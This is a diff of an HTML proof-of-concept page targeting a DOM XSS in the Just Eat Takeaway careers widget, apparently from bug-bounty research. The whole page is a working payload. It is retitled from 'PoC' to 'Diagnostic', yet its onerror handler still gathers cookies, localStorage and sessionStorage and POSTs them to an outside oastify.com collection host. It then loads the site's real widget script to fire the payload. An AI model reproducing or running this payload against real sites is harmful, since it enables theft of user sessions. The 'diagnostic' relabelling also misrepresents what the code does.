@@ -2,25 +2,34 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>🔥 Just Eat Widget XSS PoC</title>
+  <title>🔥 Just Eat Careers XSS Diagnostic</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
-<h2>🔥 DOM XSS in Just Eat Careers Widget</h2>
+<h2>🔥 DOM XSS Diagnostic - Just Eat Careers Widget</h2>
 
-<!-- Trigger the vulnerable widget -->
-<div class="ph-widget" as-element="exploitWidget">
+<!-- Exploit widget (triggers PhEnhancer parser) -->
+<div class="ph-widget" as-element="xssdiag">
   <img src=x onerror="
     (() => {
+      const id = Date.now() + '-' + Math.random().toString(36).slice(2);
+      const c = document.cookie;
+      const l = JSON.stringify(localStorage || {});
+      const s = JSON.stringify(sessionStorage || {});
       const data = {
-        cookie: document.cookie,
-        localStorage: JSON.stringify(localStorage),
-        sessionStorage: JSON.stringify(sessionStorage),
+        traceId: id,
+        timestamp: new Date().toISOString(),
         url: location.href,
         origin: location.origin,
         referrer: document.referrer,
         userAgent: navigator.userAgent,
-        time: new Date().toISOString()
+        cookie: c,
+        cookiePresent: c.length > 0,
+        cookieLength: c.length,
+        localStoragePresent: l.length > 2,
+        localStorageLength: l.length,
+        sessionStoragePresent: s.length > 2,
+        sessionStorageLength: s.length
       };
       fetch('https://nkbvpem6fl012m09pcdndrttmksdg44t.oastify.com', {
         method: 'POST',
@@ -32,10 +41,9 @@
   ">
 </div>
 
-<!-- Load vulnerable Phenom script -->
+<!-- Load widget script -->
 <script src="https://careers.justeattakeaway.com/global/en/phenomtrack.min.js"></script>
 <script>
-  // Trigger parsing of widget
   if (window.PhEnhancer) PhEnhancer();
 </script>
 </body>
